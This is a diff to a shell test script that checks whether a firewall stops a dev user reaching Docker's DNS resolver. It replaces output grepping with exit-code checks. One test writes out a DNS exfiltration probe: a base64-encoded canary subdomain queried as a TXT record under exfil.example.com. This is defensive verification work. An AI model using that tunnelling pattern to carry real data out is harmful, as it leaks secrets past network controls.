@@ -33,16 +33,30 @@ fi
 # 127.0.0.11 is Docker's built-in resolver; the firewall drops dev :53, so
 # dig must time out / return no answer section.
 # ---------------------------------------------------------------------------
-ANSWER="$(dig +time=3 +tries=1 +noall +answer A example.com @127.0.0.11 2>/dev/null)"
-if grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' <<< "${ANSWER}" | grep -q .; then
-  fail "DNS tunnel STILL OPEN: 'dig A example.com @127.0.0.11' returned an address"
+# Judge the tunnel by dig's EXIT CODE, not by scanning its output text:
+#   rc < 9  -> a server actually answered (0 = answer, 3 = NXDOMAIN, 2 =
+#              SERVFAIL, ...) => the resolver is REACHABLE => tunnel open.
+#   rc >= 9 -> dig hit a local comm-error (9) or timed out (12) => no server
+#              was reached => the drop rule is in effect => blocked.
+# Scanning the text would false-fail: dig prints a
+#   ";; communications error to 127.0.0.11#53: connection refused"
+# line to stdout even when blocked, and grepping that for an IPv4 matches the
+# resolver's own address (127.0.0.11) and reports a phantom answer.
+dig_reached() {
+  local rc
+  dig +time=3 +tries=1 "$@" >/dev/null 2>&1
+  rc=$?
+  [[ ${rc} -lt 9 ]]
+}
+
+if dig_reached example.com A @127.0.0.11; then
+  fail "DNS tunnel STILL OPEN: dev uid reached resolver 127.0.0.11 (A example.com answered)"
 fi
 
 # The classic exfil pattern: TXT record on a data-bearing subdomain.
 SUB="$(printf '%s' "ocs-canary-${RANDOM}${RANDOM}" | base64 -w0 2>/dev/null || printf '%s' "ocs-canary" | base64)"
-TXTOUT="$(dig +time=3 +tries=1 +noall +answer "TXT ${SUB}.exfil.example.com" @127.0.0.11 2>/dev/null)"
-if grep -q '"' <<< "${TXTOUT}"; then
-  fail "DNS tunnel STILL OPEN: TXT exfil pattern returned data via 127.0.0.11"
+if dig_reached "${SUB}.exfil.example.com" TXT @127.0.0.11; then
+  fail "DNS tunnel STILL OPEN: dev uid reached resolver 127.0.0.11 (TXT exfil pattern answered)"
 fi
 
 # ---------------------------------------------------------------------------
